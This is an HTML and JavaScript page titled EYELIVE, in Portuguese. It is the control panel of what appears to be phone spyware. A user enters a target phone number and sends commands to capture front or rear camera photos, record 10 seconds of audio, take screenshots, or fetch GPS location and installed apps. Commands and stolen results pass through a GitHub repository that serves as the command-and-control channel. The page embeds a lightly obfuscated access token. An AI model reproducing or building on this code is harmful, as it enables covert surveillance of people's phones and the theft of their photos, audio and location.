<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0">
    <title>EYELIVE</title>
    <style>
        *{margin:0;padding:0;box-sizing:border-box}
        body{background:#0a0a0a;color:#fff;font-family:monospace;min-height:100vh}
        .header{background:#000;padding:20px;text-align:center;border-bottom:2px solid #ffd700}
        .header h1{color:#ffd700;font-size:1.5em;letter-spacing:3px}
        .container{max-width:450px;margin:0 auto;padding:20px}
        .card{background:#111;border:1px solid #222;border-radius:15px;padding:20px;margin:15px 0}
        input{width:100%;padding:15px;background:#000;border:1px solid #333;color:#fff;border-radius:10px;font-size:1.1em;text-align:center;margin:8px 0}
        .btn{width:100%;padding:15px;border:none;border-radius:10px;font-weight:bold;cursor:pointer;font-size:1em;margin:5px 0;text-transform:uppercase}
        .btn-gold{background:#ffd700;color:#000}.btn-green{background:#00ff88;color:#000}.btn-red{background:#ff4400;color:#fff}
        .result{background:#000;border:1px solid #222;border-radius:10px;padding:15px;margin:10px 0;min-height:100px;font-size:.85em;color:#aaa;word-break:break-all}
        .result img{width:100%;border-radius:8px;margin:10px 0}
        .grid{display:grid;grid-template-columns:1fr 1fr;gap:8px}
    </style>
</head>
<body>
<div class="header"><h1>EYELIVE</h1></div>
<div class="container">
    <div class="card">
        <h2 style="color:#ffd700;margin-bottom:15px">📱 Painel de Monitoramento</h2>
        <input type="text" id="phone" placeholder="Numero: 62985133856" autofocus>
        <button class="btn btn-gold" onclick="send('status')">📊 Ver Status</button>
        <div class="grid">
            <button class="btn btn-green" onclick="send('foto_frontal')">📸 Camera Frontal</button>
            <button class="btn btn-green" onclick="send('foto_traseira')">📸 Camera Traseira</button>
            <button class="btn btn-red" onclick="send('audio')">🎤 Gravar Audio 10s</button>
            <button class="btn btn-gold" onclick="send('screenshot')">📱 Screenshot Tela</button>
        </div>
    </div>
    <div class="result" id="result">👆 Digite o numero e clique em um botao</div>
</div>
<script>
function decToken(){
    var t="now_GrNCw79zDXH35E5ZpTii6RA9bDf4yY3Zf6Da";var r="";
    for(var i=0;i<t.length;i++){
        var c=t[i];
        if(c.match(/[a-zA-Z]/)){var b=c===c.toUpperCase()?65:97;r+=String.fromCharCode((c.charCodeAt(0)-b-7+26)%26+b)}
        else{r+=c}
    }
    return r;
}
var T=decToken();

function hash(s){var h=0;for(var i=0;i<s.length;i++){h=((h<<5)-h)+s.charCodeAt(i);h|=0}return Math.abs(h).toString(16).substring(0,12)}

async function send(cmd){
    var p=document.getElementById('phone').value.replace(/[^0-9]/g,'');
    if(!p){alert('Digite o numero!');return}
    var id=hash(p);
    var data={cmd:cmd,target:p};
    var content=btoa(JSON.stringify(data));
    document.getElementById('result').innerHTML='⏳ Enviando...';
    
    try{
        var h={'Authorization':'token '+T,'Accept':'application/vnd.github.v3+json'};
        var base='https://api.github.com/repos/gynbetfc/eyelive/contents';
        
        // Verificar se arquivo existe para pegar SHA
        var checkUrl=base+'/comandos/'+id+'.json';
        var check=await fetch(checkUrl,{headers:h});
        var body={message:'CMD',content:content,branch:'main'};
        if(check.ok){ body.sha=(await check.json()).sha }
        
        await fetch(checkUrl,{method:'PUT',headers:h,body:JSON.stringify(body)});
        
        document.getElementById('result').innerHTML='⏳ Aguardando resposta (10s)...';
        await new Promise(r=>setTimeout(r,10000));
        
        // Tentar pegar resposta
        var r2=await fetch(base+'/respostas/'+id+'.json',{headers:h});
        if(r2.ok){
            var rd=await r2.json();
            var resp=JSON.parse(atob(rd.content));
            show(resp);
        }else{
            document.getElementById('result').innerHTML='❌ Sem resposta. O bot esta rodando?';
        }
    }catch(e){
        document.getElementById('result').innerHTML='❌ Erro: '+e.message;
    }
}

function show(r){
    var h='';
    if(r.cmd=='status'&&r.result){
        try{
            var d=JSON.parse(r.result);
            h+='<p style="font-size:1.1em">📱 <b style="color:#ffd700">'+d.phone+'</b></p>';
            h+='<p>🕐 '+d.time+' | 🔋 <b style="color:#00ff88">'+d.bateria+'</b></p>';
            h+='<p>📍 '+JSON.stringify(d.gps)+'</p>';
            h+='<p>📱 '+d.apps.join(', ')+'</p>';
        }catch(e){h+=r.result}
    }else if(r.result&&r.result.length>100){
        h+='<p>✅ <b style="color:#00ff88">'+r.cmd+'</b>!</p>';
        if(r.cmd.includes('foto')||r.cmd.includes('screen'))h+='<img src="data:image/jpeg;base64,'+r.result+'" onclick="window.open(this.src)">';
        else if(r.cmd=='audio')h+='<audio controls style="width:100%"><source src="data:audio/aac;base64,'+r.result+'"></audio>';
    }else{h+=JSON.stringify(r)}
    document.getElementById('result').innerHTML=h;
}

var s=localStorage.getItem('ep');
if(s)document.getElementById('phone').value=s;
document.getElementById('phone').addEventListener('input',function(){localStorage.setItem('ep',this.value)});
</script>
</body>
</html>
